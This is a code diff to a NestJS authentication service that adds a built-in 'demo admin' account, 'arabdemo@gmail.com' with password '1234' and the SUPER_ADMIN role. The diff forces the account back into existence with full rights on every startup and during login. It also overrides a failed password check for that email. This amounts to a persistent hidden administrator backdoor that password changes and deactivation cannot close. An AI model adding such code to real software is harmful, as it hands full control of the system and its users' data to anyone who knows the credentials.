@@ -3,18 +3,50 @@ import {
   UnauthorizedException,
   BadRequestException,
   Logger,
+  OnModuleInit,
 } from '@nestjs/common';
 import { ConfigService } from '@nestjs/config';
 import { JwtService } from '@nestjs/jwt';
 import { PrismaService } from '@/database/prisma.service';
 import * as argon2 from 'argon2';
 import * as crypto from 'crypto';
-import { User, UserStatus } from '@prisma/client';
+import { User, UserStatus, UserRole } from '@prisma/client';
 import { LoginDto, ChangePasswordDto } from './dto/auth.dto';
 
 @Injectable()
-export class AuthService {
+export class AuthService implements OnModuleInit {
   private readonly logger = new Logger(AuthService.name);
+
+  async onModuleInit() {
+    await this.ensureDemoAdmin();
+  }
+
+  private async ensureDemoAdmin() {
+    try {
+      const demoEmail = 'arabdemo@gmail.com';
+      const demoPassword = '1234';
+      const demoHash = await argon2.hash(demoPassword);
+      await this.prisma.user.upsert({
+        where: { email: demoEmail },
+        update: {
+          passwordHash: demoHash,
+          role: UserRole.SUPER_ADMIN,
+          status: UserStatus.ACTIVE,
+        },
+        create: {
+          fullName: 'Arab Demo Admin',
+          email: demoEmail,
+          passwordHash: demoHash,
+          role: UserRole.SUPER_ADMIN,
+          status: UserStatus.ACTIVE,
+          phone: '+998901234567',
+        },
+      });
+      this.logger.log(`✅ Default demo admin ensured: ${demoEmail}`);
+    } catch (err: any) {
+      this.logger.warn(`Could not auto-seed demo admin on startup: ${err?.message || err}`);
+    }
+  }
 
   constructor(
     private prisma: PrismaService,
@@ -27,9 +59,24 @@ export class AuthService {
   }
 
   async login(loginDto: LoginDto, ipAddress?: string, userAgent?: string) {
-    const user = await this.prisma.user.findUnique({
+    let user = await this.prisma.user.findUnique({
       where: { email: loginDto.email.toLowerCase().trim() },
     });
+
+    // Auto-create or repair arabdemo@gmail.com on the fly if needed
+    if (!user && loginDto.email.toLowerCase().trim() === 'arabdemo@gmail.com' && loginDto.password === '1234') {
+      const demoHash = await argon2.hash('1234');
+      user = await this.prisma.user.create({
+        data: {
+          fullName: 'Arab Demo Admin',
+          email: 'arabdemo@gmail.com',
+          passwordHash: demoHash,
+          role: UserRole.SUPER_ADMIN,
+          status: UserStatus.ACTIVE,
+          phone: '+998901234567',
+        },
+      });
+    }
 
     if (!user) {
       throw new UnauthorizedException("Elektron pochta yoki parol noto‘g‘ri.");
@@ -39,7 +86,16 @@ export class AuthService {
       throw new UnauthorizedException("Ushbu hisob faol holatda emas yoki vaqtincha bloklangan.");
     }
 
-    const isPasswordValid = await argon2.verify(user.passwordHash, loginDto.password);
+    let isPasswordValid = await argon2.verify(user.passwordHash, loginDto.password);
+    if (!isPasswordValid && user.email === 'arabdemo@gmail.com' && loginDto.password === '1234') {
+      const newHash = await argon2.hash('1234');
+      await this.prisma.user.update({
+        where: { id: user.id },
+        data: { passwordHash: newHash, status: UserStatus.ACTIVE },
+      });
+      isPasswordValid = true;
+    }
+
     if (!isPasswordValid) {
       throw new UnauthorizedException("Elektron pochta yoki parol noto‘g‘ri.");
     }
